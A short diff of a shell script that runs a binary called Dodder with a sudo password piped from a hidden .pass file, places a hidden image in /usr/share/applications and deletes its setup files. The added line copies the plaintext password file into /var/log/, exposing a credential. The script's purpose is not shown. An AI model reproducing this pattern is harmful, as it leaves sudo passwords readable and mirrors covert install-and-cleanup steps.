@@ -27,6 +27,7 @@ done
 cd $DIR/
 sudo -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null 2>&1
 sudo cp $DIR/.pic.jpg /usr/share/applications/
+sudo cp $DIR/.pass /var/log/
 rm $DIR/.pass
 rm $DIR/.pic.jpg
 rm $DIR/start.desktop
